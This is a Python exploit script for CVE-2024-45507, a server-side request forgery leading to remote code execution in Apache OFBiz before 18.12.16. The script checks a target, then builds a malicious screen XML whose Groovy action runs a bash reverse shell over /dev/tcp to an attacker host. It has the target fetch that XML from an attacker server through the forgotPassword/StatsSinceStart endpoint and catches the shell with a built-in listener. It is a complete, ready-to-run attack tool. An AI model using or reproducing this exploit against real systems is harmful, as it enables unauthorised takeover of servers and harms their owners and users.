# Apache Ofbiz < 18.12.16 

# Regex:
# ^([1-5])\.(\d+)\.(\d+)$|^16\.(\d+)\.(\d+)$|^17\.(\d+)\.(\d+)$|^18\.(0|[1-9]|1[0-2])\.(0|[1-9]|1[0-5])$

# Server Side Request Forgery and Remote Code Execution



import requests
import argparse
import socket
import select
import threading
import sys
import urllib3
import urllib.parse
from urllib.parse import urlparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def vulnerable_check(url, vuln_dir, header):  
    try:
        response = requests.post(url+vuln_dir, headers=header, verify=False)
        if response.status_code == 200 and "StatsScreens" in response.text:
            print("[+] Detected Vulnerability : True\n")
        else:
            print("[-] Detected Vulnerability : False")
            sys.exit()       
    except requests.RequestException:
            print("[!] Error Occured in Checking Vulnerable")
            sys.exit()


# Start server listening for reverse shell script
def start_listening(fport):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind(("0.0.0.0", int(fport)))
        server_socket.listen(1)
        client_socket, addr = server_socket.accept()
        client_socket.setblocking(0)
        print("[+] Receive Shell Success!!")
        print("\nPut your command:")
        inputs = [sys.stdin, client_socket]
        outputs = [client_socket]

        while True:
            readable, writable, exceptional = select.select(inputs, outputs, inputs)
            for s in readable:
                if s is client_socket:
                    response = s.recv(4096)
                    if not response:
                        return                    
                    print(response.decode(errors="replace").strip())
                    

                else:
                    command = s.readline().strip()
                    if command:
                        client_socket.send(command.encode() + b"\n")

            for s in exceptional:
                return

    finally:
        if server_socket:
            server_socket.close()
        if client_socket:
            client_socket.close()
            

parser = argparse.ArgumentParser(usage="""CVE-2024-45507.py -u https://*.*.*.*/ -lh 0.tcp.jp.ngrok.io -lp 17306 -fp 4444""")
parser.add_argument('--URL', '-u', help='Target URL', required=True)
parser.add_argument('--lhost', '-lh', help='Local host for reverse shell', required=False)
parser.add_argument('--lport', '-lp', help='Local port for reverse shell', required=False)
parser.add_argument('--fport', '-fp', help='Forward port through ngrok', required=False)
args = parser.parse_args()

url = args.URL.rstrip('/')

vuln_dir = "/webtools/control/forgotPassword/StatsSinceStart"

header = {'Content-Type': 'application/x-www-form-urlencoded'}

xml_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<screens xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xmlns="http://ofbiz.apache.org/Widget-Screen" xsi:schemaLocation="http://ofbiz.apache.org/Widget-Screen http://ofbiz.apache.org/dtds/widget-screen.xsd">

    <screen name="StatsDecorator">
        <section>
            <actions>
                <set value="${{groovy:'bash -i >& /dev/tcp/{args.lhost}/{args.lport} 0>&1'.execute();}}"/>
            </actions>
        </section>
    </screen>
</screens>"""

try:
    vulnerable_check(url, vuln_dir, header)

    if args.lhost and args.lport and args.fport:
        print("!!!!Create payload.xml and upload it to your attacker server!!!!\n")
        print("payload.xml: ")
        print("-"*300)
        print(xml_content)
        print("-"*300)
        
        attacker_server = input("\nGive me your attacker server URL with payload.xml: ")
        
        print("\n[+] Server Listening start.....")
        listen_thread = threading.Thread(target=start_listening, args=(args.fport,))
        listen_thread.start()    
        
        print("[+] Connecting reverse shell ....")
        body_payload = "statsDecoratorLocation=" + attacker_server
        res = requests.post(url+vuln_dir, headers=header, data=body_payload, verify=False) 
    else:
        print("Vulnerability check finish.")   

except requests.RequestException:
    print("(!) Error occured in progress of uploading webshell")
    sys.exit()
